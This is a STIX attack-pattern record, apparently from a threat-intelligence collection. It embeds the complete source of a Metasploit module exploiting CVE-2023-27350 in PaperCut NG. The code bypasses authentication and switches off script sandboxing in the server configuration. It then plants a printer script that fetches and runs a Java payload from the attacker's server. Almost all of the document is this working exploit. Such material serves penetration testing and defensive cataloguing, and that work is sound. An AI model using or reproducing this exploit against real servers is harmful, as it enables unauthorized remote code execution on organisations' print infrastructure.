{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd4e65ec-984e-4e4d-9025-c50e34dbe068",
    "created": "2024-08-14T17:07:20.421453Z",
    "modified": "2024-08-14T17:07:20.421457Z",
    "name": "PaperCut PaperCutNG Authentication Bypass",
    "description": " This module leverages an authentication bypass in PaperCut NG. If necessary it updates Papercut configuration options, specifically the 'print-and-device.script.enabled' and 'print.script.sandboxed' options to allow for arbitrary code execution running in the builtin RhinoJS engine.  This module logs at most 2 events in the application log of papercut. Each event is tied to modifcation of server settings.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/papercut_ng_auth_bypass.rb",
            "external_id": "papercut_ng_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-27350"
        },
        {
            "source_name": "reference",
            "url": "https://www.papercut.com/kb/Main/PO-1216-and-PO-1219"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/"
        },
        {
            "source_name": "reference",
            "url": "https://www.bleepingcomputer.com/news/security/hackers-actively-exploit-critical-rce-bug-in-papercut-servers/"
        },
        {
            "source_name": "reference",
            "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'cgi'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PaperCut PaperCutNG Authentication Bypass',\n        'Description' => %q{\n          This module leverages an authentication bypass in PaperCut NG. If necessary it\n          updates Papercut configuration options, specifically the 'print-and-device.script.enabled'\n          and 'print.script.sandboxed' options to allow for arbitrary code execution running in\n          the builtin RhinoJS engine.\n\n          This module logs at most 2 events in the application log of papercut. Each event is tied\n          to modifcation of server settings.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['catatonicprime'],\n        'References' => [\n          ['CVE', '2023-27350'],\n          ['ZDI', '23-233'],\n          ['URL', 'https://www.papercut.com/kb/Main/PO-1216-and-PO-1219'],\n          ['URL', 'https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/'],\n          ['URL', 'https://www.bleepingcomputer.com/news/security/hackers-actively-exploit-critical-rce-bug-in-papercut-servers/'],\n          ['URL', 'https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software']\n        ],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [ [ 'Automatic Target', {}] ],\n        'Platform' => [ 'java' ],\n        'Arch' => ARCH_JAVA,\n        'Privileged' => true,\n        'DisclosureDate' => '2023-03-13',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => '9191',\n          'SSL' => 'false'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Path to the papercut application', '/app']),\n        OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10])\n      ], self.class\n    )\n    @csrf_token = nil\n    @config_cleanup = []\n  end\n\n  def bypass_auth\n    # Attempt to generate a session & recover the anti-csrf token for future requests.\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'service' => 'page/SetupCompleted'\n        }\n      }\n    )\n    return nil unless res && res.code == 200\n\n    vprint_good(\"Bypass successful and created session: #{cookie_jar.cookies[0]}\")\n\n    # Parse the application version from the response for future decisions.\n    product_details = res.get_html_document.xpath('//div[contains(@class, \"product-details\")]//span').children[1]\n    if product_details.nil?\n      product_details = res.get_html_document.xpath('//span[contains(@class, \"version\")]')\n    end\n    version_match = product_details.text.match('(?<major>[0-9]+)\\.(?<minor>[0-9]+)')\n    @version_major = Integer(version_match[:major])\n    match = res.get_html_document.xpath('//script[contains(text(),\"csrfToken\")]').text.match(/var csrfToken ?= ?'(?<csrf>[^']*)'/)\n    @csrf_token = match ? match[:csrf] : ''\n  end\n\n  def get_config_option(name)\n    # 1) do a quickfind (setting the tapestry state)\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true,\n        'headers' => {\n          'Origin' => full_uri\n        },\n        'vars_post' => {\n          'service' => 'direct/1/ConfigEditor/quickFindForm',\n          'sp' => 'S0',\n          'Form0' => '$TextField,doQuickFind,clear',\n          '$TextField' => name,\n          'doQuickFind' => 'Go'\n        }\n      }\n    )\n    # 2) parse and return the result\n    return nil unless res && res.code == 200 && (html = res.get_html_document)\n    return nil unless (td = html.xpath(\"//td[@class='propertyNameColumnValue']\"))\n    return nil unless td.count == 1 && td.text == name\n\n    value_input = html.xpath(\"//input[@name='$TextField$0']\")\n    value_input[0]['value']\n  end\n\n  def set_config_option(name, value, rollback)\n    # set name:value pair(s)\n    current_value = get_config_option(name)\n    if current_value == value\n      vprint_good(\"Server option '#{name}' already set to '#{value}')\")\n      return\n    end\n\n    vprint_status(\"Setting server option '#{name}' to '#{value}') was '#{current_value}'\")\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true,\n        'headers' => {\n          'Origin' => full_uri\n        },\n        'vars_post' => {\n          'service' => 'direct/1/ConfigEditor/$Form',\n          'sp' => 'S1',\n          'Form1' => '$TextField$0,$Submit,$Submit$0',\n          '$TextField$0' => value,\n          '$Submit' => 'Update'\n        }\n      }\n    )\n    fail_with Failure::NotVulnerable, \"Could not update server config option '#{name}' to value of '#{value}'\" unless res && res.code == 200\n    # skip storing the cleanup change if this is rolling back a previous change\n    @config_cleanup.push([name, current_value]) unless rollback\n  end\n\n  def cleanup\n    super\n    if @config_cleanup.nil?\n      return\n    end\n\n    until @config_cleanup.empty?\n      cfg = @config_cleanup.pop\n      vprint_status(\"Rolling back '#{cfg[0]}' to '#{cfg[1]}'\")\n      set_config_option(cfg[0], cfg[1], true)\n    end\n  end\n\n  def primer\n    payload_uri = get_uri\n    script = <<~SCRIPT\n      var urls = [new java.net.URL(\"#{payload_uri}.jar\")];\n      var cl = new java.net.URLClassLoader(urls).loadClass('metasploit.Payload').newInstance().main([]);\n      s;\n    SCRIPT\n\n    # The number of parameters passed changed in version 17.\n    form0 = 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0'\n    if @version_major > 16\n      form0 += ',$Submit$1'\n    end\n    # 6) Trigger the code execution the printer_id\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true,\n        'headers' => {\n          'Origin' => full_uri\n        },\n        'vars_post' => {\n          'service' => 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',\n          'sp' => 'S0',\n          'Form0' => form0,\n          'enablePrintScript' => 'on',\n          '$Submit$1' => 'Apply',\n          'printerId' => 'l1001',\n          'scriptBody' => script\n        }\n      }\n    )\n    fail_with Failure::NotVulnerable, 'Failed to prime payload.' unless res && res.code == 200\n  end\n\n  def check\n    # For the check command\n    bypass_success = bypass_auth\n    if bypass_success.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    # Main function\n    # 1) Bypass the auth using the SetupCompleted page & store the csrf_token for future requests.\n    bypass_auth unless @csrf_token\n    if @csrf_token.nil?\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    # Sandboxing wasn't introduced until version 19\n    if @version_major >= 19\n      # 2) Enable scripts, if needed\n      set_config_option('print-and-device.script.enabled', 'Y', false)\n\n      # 3) Disable sandboxing, if needed\n      set_config_option('print.script.sandboxed', 'N', false)\n    end\n    # 5) Select the printer, this loads it into the tapestry session to be modified\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path),\n        'keep_cookies' => true,\n        'headers' => {\n          'Origin' => full_uri\n        },\n        'vars_get' => {\n          'service' => 'direct/1/PrinterList/selectPrinter',\n          'sp' => 'l1001'\n        }\n      }\n    )\n    fail_with Failure::NotVulnerable, 'Unable to select [Template Printer]' unless res && res.code == 200\n\n    Timeout.timeout(datastore['HTTPDELAY']) { super }\n  rescue Timeout::Error\n    # When the server stop due to our timeout, this is raised\n  end\n\n  def on_request_uri(cli, request)\n    vprint_status(\"Sending payload for requested uri: #{request.uri}\")\n    send_response(cli, payload.raw)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-03-13",
    "x_mitre_platforms": [
        "[ 'java' ]"
    ]
}